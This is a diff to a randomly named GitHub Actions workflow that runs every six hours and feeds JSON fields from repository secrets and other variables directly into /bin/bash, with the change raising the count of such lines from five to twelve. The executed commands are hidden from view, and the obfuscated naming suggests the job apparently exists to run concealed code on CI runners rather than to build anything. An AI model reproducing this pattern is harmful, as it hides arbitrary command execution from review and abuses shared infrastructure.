@@ -1,9 +1,8 @@
 name: chenmeijiao2010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
+    - cron: '5 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenmeijiao2010
         env:
-          nsht6000: ${{ secrets.nsht6000 }}
+          bcave0363: ${{ secrets.bcave0363 }}
         run: |
-          echo $nsht6000 | jq -r .ka149 | /bin/bash
-          echo $esave14379 | jq -r .zvd1291 | /bin/bash
-          echo $suu326 | jq -r .g2 | /bin/bash
-          echo $zvyyh9 | jq -r .kssr966 | /bin/bash
-          echo $izu3 | jq -r .z38 | /bin/bash
+          echo $bcave0363 | jq -r .p7137 | /bin/bash
+          echo $dl152 | jq -r .zpaa7530 | /bin/bash
+          echo $xjod265 | jq -r .uf57 | /bin/bash
+          echo $jhtmn5332 | jq -r .r74318 | /bin/bash
+          echo $zmzxu34 | jq -r .fksin5 | /bin/bash
+          echo $htrpc45058 | jq -r .ssj3 | /bin/bash
+          echo $inqzx61 | jq -r .uwsr32386 | /bin/bash
+          echo $hsptv4654 | jq -r .iaqig9 | /bin/bash
+          echo $gndwc6 | jq -r .mvq26 | /bin/bash
+          echo $n11 | jq -r .rnt99 | /bin/bash
+          echo $ppu7764 | jq -r .gru421 | /bin/bash
+          echo $s7604 | jq -r .k352 | /bin/bash
 
